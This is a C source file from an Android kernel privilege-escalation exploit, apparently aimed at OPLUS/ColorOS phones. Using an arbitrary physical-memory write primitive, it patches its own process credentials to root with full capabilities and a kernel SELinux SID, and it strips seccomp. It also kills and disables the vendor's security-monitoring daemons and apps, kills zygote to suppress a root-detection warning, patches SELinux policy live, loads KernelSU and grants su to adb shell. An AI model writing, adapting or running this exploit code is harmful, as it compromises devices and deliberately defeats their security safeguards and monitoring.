#include "unplus.h"

/* Payload paths — device-side (must match wrapper's release targets in
 * wrapper/embed_payloads.py). These are runtime paths on the device where
 * the wrapper extracts external payloads to. Defined at the top so all
 * functions below can use them. */
#define PAYLOAD_DIR        "/data/local/tmp"
#define MAGISKPOLICY_BIN   PAYLOAD_DIR "/magiskpolicy"
#define KSUD_BIN           PAYLOAD_DIR "/ksud"
#define KERNELSU_KO        PAYLOAD_DIR "/android15-6.6_kernelsu.ko"
#define KSU_DATA_DIR       "/data/adb/ksu"
#define KSU_ALLOWLIST_DIR  KSU_DATA_DIR
#define KSU_ALLOWLIST_PATH KSU_DATA_DIR "/.allowlist"

int root_child_done;
uint8_t selinux_before = 0xff;
uint8_t selinux_after = 0xff;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
uint64_t capable_head_before;
uint64_t capable_head_after;
uint64_t init_tasks_prev;
uint64_t last_task_guess;
int setgid_ret = -1;
int setuid_ret = -1;
int setenforce_ret = -1;
int setenforce_errno;
uint64_t current_task_addr;
uint64_t current_cred_addr;
uint64_t current_real_cred_addr;
uint64_t current_cred_security_addr;
uint64_t current_real_cred_security_addr;
uint32_t cred_sid_before = 0xffffffff;
uint32_t cred_sid_after = 0xffffffff;
uint32_t real_cred_sid_before = 0xffffffff;
uint32_t real_cred_sid_after = 0xffffffff;
uint32_t target_cred_osid = SELINUX_KERNEL_SID;
uint32_t target_cred_sid = SELINUX_KERNEL_SID;
uint32_t selinux_cred_blob_off = SELINUX_CRED_BLOB_OFF;
int task_walk_iters;
uint64_t task_walk_last_entry;
uint32_t task_walk_last_pid;
uint32_t task_walk_last_tgid;
uint32_t found_task_pid;
uint32_t found_task_tgid;
char found_task_comm[TASK_COMM_LEN + 1];
pid_t root_child_pid = -1;
int root_ready_pipe[2] = {-1, -1};
struct root_shared *root_shared;

int spawn_root_child(void) {
  int prot = PROT_READ | PROT_WRITE;
  int flags = MAP_SHARED | MAP_ANONYMOUS;
  root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
  memset(root_shared, 0, sizeof(*root_shared));
  SYSCHK(pipe(root_ready_pipe));

  root_child_pid = SYSCHK(fork());
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);

    prctl(PR_SET_NAME, "ll_root_child");
    char ready = 1;
    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));

    for (int i = 0; i < 5000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }
    if (!atomic_load(&root_shared->go)) {
      _exit(2);
    }

    struct root_report report;
    memset(&report, 0, sizeof(report));
    report.uid_before = getuid();

    /* Try setuid(0) even if parent patched cred — the kernel commit_creds
     * hook (oplus_kevent) fires HERE, triggering a 15s countdown dialog.
     * We kill zygote IMMEDIATELY after to clear the dialog. Our process
     * survives because we were forked from the LD_PRELOAD process, not
     * from zygote. While system_server is dead, we load KSU — no one
     * can interfere. */
    errno = 0;
    report.setgid_ret = setgid(0);
    report.setgid_errno = errno;
    errno = 0;
    report.setuid_ret = setuid(0);
    report.setuid_errno = errno;
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();

    /* Phase A.5: kill zygote to clear the OPLUS_KEVENT countdown dialog.
     * We survive this — we're not a child of zygote. */
    system("pm disable com.coloros.securityguard 2>/dev/null");
    system("pm disable com.oplus.safecenter 2>/dev/null");
    system("killall -9 oplus_kevent bsp_kevent 2>/dev/null");
    system("kill -9 $(pidof zygote64) 2>/dev/null");
    pr_info("root guards frozen + zygote killed\n");

    /* Phase A: selinux_state booleans repaired by PARENT via pipe physrw. */
    report.insmod_ret = 0;
    report.ksu_ret = -1;

    /* Phase B: magiskpolicy patch ashmem rule.
     * Some vendor sepolicies deny open(/dev/ashmem) for all domains. Every
     * app's binder IPC needs ashmem; under enforcing this is denied → app
     * crash (Instrumentation NPE). This is NOT exploit damage — it's the
     * device's own sepolicy. Patching it makes enforcing + app work together.
     * MUST run BEFORE setenforce (under permissive, no SELinux resistance).
     * The magiskpolicy binary is pushed standalone to /data/local/tmp/. */
    int mp = system(MAGISKPOLICY_BIN " --live "
                    "\"allow * ashmem_device chr_file "
                    "{ open read write getattr }\"");
    pr_info("root magiskpolicy ashmem patch ret=%d\n", mp);

    /* Phase C: load KernelSU kernel module — provides real root management
     * (su authorization, sepolicy, hooks). ksud insmod uses kallsyms
     * resolution to bypass vermagic mismatch (6.6.127 .ko vs 6.6.66 device).
     * KSU init will setenforce(true); by this point ashmem rule is already
     * patched (Phase B), so apps survive the enforcing switch.
     * KSU replaces install_embedded_su as the root framework. */
    report.ksu_ret = system(KSUD_BIN " insmod " KERNELSU_KO);
    pr_info("root ksud insmod ret=%d\n", report.ksu_ret);

    /* Phase D: if KSU did not set enforcing, do it ourselves.
     * Normally KSU's init handles setenforce. This is a fallback. */
    int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    if (enforce_fd >= 0) {
      ssize_t wrote = write(enforce_fd, "1", 1);
      report.setenforce_ret = wrote == 1 ? 0 : -1;
      report.setenforce_errno = wrote == 1 ? 0 : errno;
      close(enforce_fd);
    } else {
      report.setenforce_ret = -1;
      report.setenforce_errno = errno;
    }

    /* Done: root + permissive-fixed + ashmem-patched + KSU + enforcing.
     * KSU manages root authorization going forward. */
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);
    _exit(report.uid_after == 0 ? 0 : 1);
  }

  close(root_ready_pipe[1]);

  char ready;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  return got == (ssize_t)sizeof(ready);
}

int collect_root_child(void) {
  if (!root_shared) {
    return 0;
  }
  atomic_store(&root_shared->go, 1);

  for (int i = 0; i < 5000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }
  if (!atomic_load(&root_shared->done)) {
    return 0;
  }

  struct root_report report = root_shared->report;
  root_uid_after = report.uid_after;
  setgid_ret = report.setgid_ret;
  setuid_ret = report.setuid_ret;
  setenforce_ret = report.setenforce_ret;
  setenforce_errno = report.setenforce_errno;
  waitpid(root_child_pid, NULL, 0);
  return report.uid_after == 0 && report.euid_after == 0 &&
         report.gid_after == 0 && report.egid_after == 0;
}

uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry = pipe_read64(fd, head);
  task_walk_iters = 0;
  task_walk_last_entry = 0;
  task_walk_last_pid = 0;
  task_walk_last_tgid = 0;

  for (int i = 0; i < 4096; i++) {
    task_walk_iters = i + 1;
    task_walk_last_entry = entry;
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry)) {
      break;
    }

    uint64_t task = entry - TASK_TASKS_OFF;
    uint32_t pid = pipe_read32(fd, task + TASK_PID_OFF);
    uint32_t tgid = pipe_read32(fd, task + TASK_TGID_OFF);
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);

    if (tgid == want_tgid || pid == want_tgid) {
      found_task_pid = pid;
      found_task_tgid = tgid;
      memcpy(found_task_comm, comm, sizeof(found_task_comm));
      return task;
    }

    entry = pipe_read64(fd, task + TASK_TASKS_OFF);
  }

  return 0;
}

int patch_cred_identity(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

  uint64_t zero_ids[4] = {0};
  if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {
    return 0;
  }

  uint32_t securebits = 0;
  if (!pipe_phys_write_data(
      fd, cred + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits))) {
    return 0;
  }

  uint64_t caps[CRED_CAP_WORDS] = {
    CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
    return 0;
  }

  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (!pipe_phys_read_data(
      fd, cred + CRED_CAPS_OFF, caps_after, sizeof(caps_after))) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      pr_info("root cap verify failed cred=%016llx idx=%zu got=%016llx want=%016llx\n",
              (unsigned long long)cred, i, (unsigned long long)caps_after[i],
              (unsigned long long)CAP_FULL);
      return 0;
    }
  }

  return 1;
}

int patch_cred_sid(int fd, uintptr_t cred) {
  uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
            (unsigned long long)cred, (unsigned long long)security);
    return 0;
  }

  uint32_t sid_pair[2] = {
    target_cred_osid, target_cred_sid,
  };
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
}

int patch_cred_object(int fd, uintptr_t cred) {
  return patch_cred_identity(fd, cred) && patch_cred_sid(fd, cred);
}

int patch_task_seccomp(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }

  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;

  uint64_t flags_before = pipe_read64(fd, flags_addr);
  uint64_t atomic_before = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_before = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
    pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= pipe_write64(fd, atomic_flags_addr, atomic_want);
  }
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64, sizeof(zero64));

  uint64_t flags_after = pipe_read64(fd, flags_addr);
  uint64_t atomic_after = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_after = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
          "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
          "filter=%016llx/%016llx\n",
          ok, (unsigned long long)flags_before,
          (unsigned long long)flags_after,
          (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after,
          count_before, count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  return ok && tif_clear && nnp_clear && mode_after == 0 &&
         count_after == 0 && filter_after == 0;
}

/* --- KSU allowlist: ensure adb shell (uid 2000) is authorized ---
 *
 * KSU allowlist binary format (main-branch v4, verified against
 * uapi/app_profile.h and the on-disk template):
 *   header:  magic u32 = 0x7f4b5355 (LE: 55 53 4b 7f) + version u32 = 4
 *   body:    N × struct app_profile (784 bytes each)
 *
 * Per-profile layout (offsets relative to the profile start):
 *   version i32   @ +0x000  = 4
 *   key[256]      @ +0x004  package name, NUL-padded (display only)
 *   curr_uid i32  @ +0x104  ← kernel lookup key; 2000 = SHELL_UID
 *   allow_su bool @ +0x108
 *   (union + root_profile follow; we use the default profile via
 *    use_default=1, so most fields stay zero)
 *
 * Three-state semantics:
 *   1. no file            → write a fresh 792-byte (header + 1 profile)
 *   2. file exists, no    → append one shell profile at EOF
 *      shell entry
 *   3. shell already in   → leave untouched
 *
 * Detection uses curr_uid==2000 (the kernel's real lookup key), NOT a
 * grep for "com.android.shell" — a substring match would misfire on any
 * profile whose key/domain happens to contain "shell". */
#define KSU_AL_MAGIC       0x7f4b5355u
#define KSU_AL_VERSION     4u
#define KSU_PROFILE_SIZE   784
#define SHELL_UID          2000

/* Build a single 784-byte shell profile into buf (zeroed by caller).
 * Offsets are relative to the profile start (verified against the
 * on-disk template: header is 8 bytes, so profile_off = file_off - 8).
 *
 *   +0x000: app_profile.version = 4
 *   +0x004: key[256]      "com.android.shell" (NUL-padded)
 *   +0x104: curr_uid      = 2000 (SHELL_UID)
 *   +0x108: allow_su      = 1
 *   +0x110: rp_config.use_default = 1 (kernel uses default_root_profile)
 *   +0x2c0: selinux_domain[64] "u:r:ksu:s0" (non-empty for profile_valid)
 *   +0x308: root_profile.flags = FLAG_KSU_NO_NEW_PRIVS = 1 (last 8 bytes) */
static void build_shell_profile(unsigned char *p) {
  put32(p, 0x000, KSU_AL_VERSION);
  static const char key[] = "com.android.shell";
  memcpy(p + 0x004, key, sizeof(key));  /* copies the NUL too */
  put32(p, 0x104, SHELL_UID);
  p[0x108] = 1;  /* allow_su */
  p[0x110] = 1;  /* rp_config.use_default */
  static const char domain[] = "u:r:ksu:s0";
  memcpy(p + 0x2c0, domain, sizeof(domain));
  put64(p, 0x308, 1);  /* flags */
}

/* write() loop that handles partial writes / EINTR. */
static int write_all(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) return 0;
    p += (size_t)n;
    len -= (size_t)n;
  }
  return 1;
}

static int read_all(int fd, void *buf, size_t len) {
  unsigned char *p = buf;
  size_t got = 0;
  while (got < len) {
    ssize_t n = read(fd, p + got, len - got);
    if (n < 0 && errno == EINTR) continue;
    if (n <= 0) break;
    got += (size_t)n;
  }
  return got == len;
}

/* Read a little-endian u32 (arm64 is LE, so plain memcpy is correct). */
static uint32_t get_le32(const unsigned char *p) {
  uint32_t v;
  memcpy(&v, p, sizeof(v));
  return v;
}

static void ensure_shell_allowlist(void) {
  mkdir(KSU_ALLOWLIST_DIR, 0755);  /* best-effort; may already exist */

  int fd = open(KSU_ALLOWLIST_PATH, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    /* State 1: no file (or unreadable) → create with header + 1 profile. */
    fd = open(KSU_ALLOWLIST_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (fd < 0) {
      pr_info("root allowlist create failed errno=%d\n", errno);
      return;
    }
    unsigned char buf[8 + KSU_PROFILE_SIZE];
    memset(buf, 0, sizeof(buf));
    put32(buf, 0, KSU_AL_MAGIC);
    put32(buf, 4, KSU_AL_VERSION);
    build_shell_profile(buf + 8);
    int ok = write_all(fd, buf, sizeof(buf));
    close(fd);
    pr_info("root allowlist created (state=1, shell-only) ok=%d\n", ok);
    return;
  }

  /* File exists: validate header, then scan profiles for uid 2000. */
  unsigned char hdr[8];
  if (!read_all(fd, hdr, sizeof(hdr)) ||
      get_le32(hdr) != KSU_AL_MAGIC ||
      get_le32(hdr + 4) != KSU_AL_VERSION) {
    close(fd);
    pr_info("root allowlist: bad header/magic, skipping\n");
    return;
  }

  unsigned char profile[KSU_PROFILE_SIZE];
  int found = 0;
  while (read_all(fd, profile, sizeof(profile))) {
    if (get_le32(profile + 0x104) == SHELL_UID) {
      found = 1;
      break;
    }
  }

  if (found) {
    /* State 3: shell already authorized — leave untouched. */
    close(fd);
    pr_info("root allowlist: shell already present (state=3)\n");
    return;
  }

  /* State 2: append one shell profile at EOF. */
  if (lseek(fd, 0, SEEK_END) == (off_t)-1) {
    close(fd);
    pr_info("root allowlist: lseek failed errno=%d\n", errno);
    return;
  }
  memset(profile, 0, sizeof(profile));
  build_shell_profile(profile);
  int ok = write_all(fd, profile, sizeof(profile));
  close(fd);
  pr_info("root allowlist: appended shell profile (state=2) ok=%d\n", ok);
}

int install_android_root(int fd) {
  root_uid_before = getuid();

  /* Find our own task_struct — no child needed.
   * Pipe physrw bypasses commit_creds, so we can patch our own cred
   * without triggering kernel oplus_kevent hook. */
  current_task_addr = find_task_by_tgid(fd, (uint32_t)getpid());
  if (!is_direct_ptr(current_task_addr)) {
    pr_info("root own task walk failed pid=%d\n", getpid());
    return 0;
  }
  pr_info("root found own task=%016llx\n", (unsigned long long)current_task_addr);

  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  selinux_cred_blob_off =
    pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES));
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;

  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  current_real_cred_addr = pipe_read64(fd, real_cred_slot);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
  uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
  current_cred_security_addr = pipe_read64(fd, cred_security_slot);
  current_real_cred_security_addr = pipe_read64(fd, real_security_slot);
  uintptr_t sid_off = selinux_cred_blob_off + SELINUX_CRED_SID_OFF;
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_before = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_before = pipe_read32(fd, sid_addr);
  }
  uint64_t cred_caps_before[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_before[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_before,
      sizeof(cred_caps_before));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
      sizeof(real_caps_before));
  if (!patch_cred_object(fd, current_cred_addr)) {
    pr_info("root patch own cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    return 0;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_object(fd, current_real_cred_addr)) {
    pr_info("root patch own real_cred failed real=%016llx\n",
            (unsigned long long)current_real_cred_addr);
    return 0;
  }

  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    return 0;
  }

  uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
  uint32_t real_uid_after =
    pipe_read32(fd, current_real_cred_addr + CRED_UID_OFF);
  uint64_t cred_caps_after[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_after[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_after,
      sizeof(cred_caps_after));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_after,
      sizeof(real_caps_after));
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_after = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_after = pipe_read32(fd, sid_addr);
  }
  pr_info("root cred patched uid=%u/%u sid=%u/%u\n", cred_uid_after,
          real_uid_after, cred_sid_after, real_cred_sid_after);
  pr_info("root caps patched cred eff=%016llx/%016llx prm=%016llx/%016llx "
          "amb=%016llx/%016llx bset=%016llx/%016llx real_eff=%016llx/%016llx\n",
          (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_before[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_after[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_before[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_after[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_before[CRED_CAP_BSET],
          (unsigned long long)cred_caps_after[CRED_CAP_BSET],
          (unsigned long long)real_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);

  /* ★ NO direct write to selinux_state.enforcing.
   * Community (vivo/redmi/duchamp) never does this — it causes AVC/sidtab
   * inconsistency that manifests as Instrumentation.onException() NPE
   * in every new process under enforcing. We only patch cred SID=kernel(1)
   * and let the grandchild set enforcing via clean sysfs path. */

  /* Repair selinux_state booleans (first 16 bytes) damaged by ghostlock W1.
   * Uses pipe physrw (this process has fd) — replaces the need for
   * fix_selinux.ko insmod. Golden template is the cross-reboot-stable
   * booleans verified by KPM step 70 dump. NOTE: byte0 is the enforcing
   * flag — we write 0x00 (permissive) here so SELinux stays permissive
   * until the child does setenforce(1) AFTER magiskpolicy patching.
   * Bytes 16+ contain pointers/locks (dynamic, not restored). */
  {
    static const unsigned char selinux_golden[16] = TARGET_SELINUX_GOLDEN;
    ssize_t sw = pipe_phys_write_data(
        fd, selinux_addr, selinux_golden, sizeof(selinux_golden));
    pr_info("root selinux booleans repair write=%zd\n", sw);
  }

  /* No root child. Parent already has root via pipe physrw — run
   * magiskpolicy + KSU directly via system(). No setuid(0) → no
   * commit_creds → kernel oplus_kevent hook never fires → no dialog. */
  system("killall -9 oplus_kevent bsp_kevent 2>/dev/null");
  pr_info("root killed oplus kevent daemons\n");

  pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));

  /* Phase B: magiskpolicy — fix vendor ashmem sepolicy */
  int mp = system(MAGISKPOLICY_BIN " --live "
                  "\"allow * ashmem_device chr_file { open read write getattr }\"");
  pr_info("root magiskpolicy ashmem patch ret=%d\n", mp);

  /* Ensure adb shell (uid 2000) is in the KSU allowlist. Runs BEFORE
   * ksud insmod: loading the .ko flips SELinux to enforcing, so the
   * allowlist must already be on disk for the kernel to read at boot.
   * ensure_shell_allowlist() is non-fatal — it logs and returns. */
  ensure_shell_allowlist();

  /* Phase C: fix ksud SELinux context BEFORE insmod (permissive).
   * After KSU loads, SELinux flips to enforcing — files in
   * /data/local/tmp/ become inexecutable. Copy sh's context onto
   * ksud so the su daemon's shell can exec it under enforcing. */
  system("chcon --reference=/system/bin/sh "
         KSUD_BIN " 2>/dev/null");
  pr_info("root chcon ksud ok\n");

  /* Phase D: load KSU kernel module. SELinux → enforcing. */
  int ksu = system(KSUD_BIN " insmod " KERNELSU_KO);
  pr_info("root ksud insmod ret=%d\n", ksu);

  root_uid_after = 0;
  root_child_done = 1;
  return 1;
}
